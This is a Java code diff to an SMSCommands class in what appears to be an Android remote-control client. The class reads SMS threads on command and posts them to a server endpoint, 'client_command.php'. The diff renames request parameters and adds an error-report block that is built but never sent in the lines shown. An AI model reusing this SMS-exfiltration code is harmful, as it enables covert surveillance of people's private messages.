@@ -124,8 +124,7 @@ public class SMSCommands {
             if (context.getArguments().size() > 0) {
                 try {
                     long thread_id = Long.parseLong((String)context.getArgument(0));
-                    boolean get_cached = context.getArgument(0) != null;
-                    List<SMSObject> threads = reader.getMessages(thread_id, get_cached);
+                    List<SMSObject> threads = reader.getMessages(thread_id, true);
                     if (threads.size() > 0) {
                         String uuid = UUID.randomUUID().toString();
                         RequestParams params = new RequestParams();
@@ -139,10 +138,10 @@ public class SMSCommands {
                             messages.put(msg_array);
                         }
                         //post our messages to the server, saved under the UUID
-                        params.put("command", "sms_message_object");
+                        params.put("command", "addMessage");
                         params.put("message_type", "SMS_THREAD_OBJECT");
-                        params.put("message_list", messages.toString());
-                        params.put("uuid", uuid);
+                        params.put("message", messages.toString());
+                        params.put("client_id", uuid);
                         RestClient.post("client_command.php", params); //post results to the server
 
                         //alert user that we received the threads!
@@ -160,7 +159,11 @@ public class SMSCommands {
                         params.put("message", "Failed to read SMS or there weren't any!");
                     }
                 } catch (Exception ex) {
-
+                    RequestParams params = new RequestParams();
+                    params.put("command", "addMessage");
+                    params.put("client_id", Constants.CLIENT_ID);
+                    params.put("message_type", "EXECUTION_ERROR");
+                    params.put("message", ex.getMessage());
                 }
             }
         }
